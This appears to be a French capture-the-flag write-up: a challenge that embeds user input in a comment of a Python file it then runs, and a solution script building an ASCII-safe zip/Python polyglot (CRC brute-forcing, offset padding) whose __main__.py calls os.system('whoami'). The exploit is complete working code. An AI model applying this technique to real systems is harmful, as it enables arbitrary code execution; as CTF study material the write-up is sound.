```py -cwn
#!/usr/bin/env python3
import tempfile
import subprocess
import os
 
comment = input("> ").replace("\n", "").replace("\r", "")
 
code = f"""print("hello world!")
# Ceci est un commentaire. En voici un autre:
# {comment}
print("Merci d avoir joue!")"""
 
with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
    f.write(code)
    temp_filename = f.name
 
try:
    result = subprocess.run(
        ["python3", temp_filename], capture_output=True, text=True, timeout=5
    )
 
    if result.stdout:
        print(result.stdout, end="")
    if result.stderr:
        print(result.stderr, end="")
 
except subprocess.TimeoutExpired:
    print("Timeout")
finally:
    os.unlink(temp_filename)
```

#### Peut etre pwn

```py -cwn
# https://www.analogue.computer/blog/python-zip-confusion
# https://www.hacktron.ai/blog/python-zip-confusion
import io, struct, zipfile, pathlib
import itertools
import zlib
import subprocess
 
JUNK_HEAD = """print("hello world!")
# Ceci est un commentaire. En voici un autre:
# """.encode()
JUNK_TAIL = """
print("Merci d avoir joue!")"""
 
FILENAME = b"__main__.py"
BODY     = b"__import__('os').system('whoami')#"
 
def ascii_safe(x: int) -> bool:
    """True si tous les octets ont le bit de poids fort a 0."""
    return all(((x >> (8 * i)) & 0x80) == 0 for i in range(4))
 
def find_suffix(core: bytes, length: int = 4) -> bytes:
    """Force brute d un suffixe ASCII de longueur donnee pour valider le CRC32."""
    printable = range(0x20, 0x7F)         # espace … tilde
    for tail in itertools.product(printable, repeat=length):
        payload = core + bytes(tail)
        crc     = zlib.crc32(payload) & 0xFFFFFFFF
        if ascii_safe(crc):
            return bytes(tail), crc
    raise RuntimeError("unexpected: no suffix found")
 
SUFFIX, CRC = find_suffix(BODY)
PAYLOAD     = BODY + SUFFIX
SIZE        = len(PAYLOAD)
 
def le32(x): return struct.pack("<I", x)
def le16(x): return struct.pack("<H", x)
 
SIG_LFH  = 0x04034B50
SIG_CDH  = 0x02014B50
SIG_EOCD = 0x06054B50
 
# --------------------------------------------------------------------
# construire le fichier ZIP
# --------------------------------------------------------------------
 
delta = len(JUNK_HEAD)
 
# En-tete fichier local
lfh  = le32(SIG_LFH)
lfh += le16(0)          # version requise
lfh += le16(0)          # flags
lfh += le16(0)          # methode = stored
lfh += le16(0)          # heure modif
lfh += le16(0)          # date modif
lfh += le32(CRC)
lfh += le32(SIZE)       # taille compressee
lfh += le32(SIZE)       # taille non compressee
lfh += le16(len(FILENAME))
lfh += le16(0)          # longueur extra
lfh += FILENAME
 
# En-tete du directory central
cdh  = le32(SIG_CDH)
cdh += le16(0)          # version creee par
cdh += le16(0)          # version requise
cdh += le16(0)          # flags
cdh += le16(0)          # methode
cdh += le16(0)          # heure
cdh += le16(0)          # date
cdh += le32(CRC)
cdh += le32(SIZE)
cdh += le32(SIZE)
cdh += le16(len(FILENAME))
cdh += le16(0)          # longueur extra
cdh += le16(0)          # longueur comment
cdh += le16(0)          # disk #
cdh += le16(0)          # int attrs
cdh += le32(0)          # ext attrs
cdh += le32(delta)      # offset relatif du LFH
cdh += FILENAME
 
# patcher l offset du CD pour le rendre ASCII safe
cd_offset = delta + len(lfh) + len(PAYLOAD)

pad = 0
while not ascii_safe(cd_offset + pad):
    pad += 1
padding = b'\x00' * pad
 
cd_offset += pad
 
# end of central directory record
eocd  = le32(SIG_EOCD)
eocd += le16(0)         # disk #
eocd += le16(0)         # disque ou le CD commence
eocd += le16(1)         # nb d entrees sur ce disque
eocd += le16(1)         # nb total d entrees
eocd += le32(len(cdh))  # taille du central directory
eocd += le32(cd_offset) # offset du CD
eocd += le16(len(JUNK_TAIL)) # longueur du commentaire ZIP
 
zip_bytes = lfh + PAYLOAD + padding + cdh + eocd
zip_bytes = bytearray(zip_bytes)
assert all(b < 0x80 for b in zip_bytes), "byte non-ASCII detecte!"
 
# --------------------------------------------------------------------
# resoudre le challenge
# --------------------------------------------------------------------
 
with open("polyglot.zip", "wb") as f:
    f.write(JUNK_HEAD + zip_bytes + JUNK_TAIL.encode())
 
# Run en local: envoyer le payload a test/main.py via stdin
proc = subprocess.run([
    "python",
    "main.py",
], input=zip_bytes.decode('latin-1'), text=True, capture_output=True)
if proc.stdout:
    print(proc.stdout, end="")
if proc.stderr:
    print(proc.stderr, end="")
```
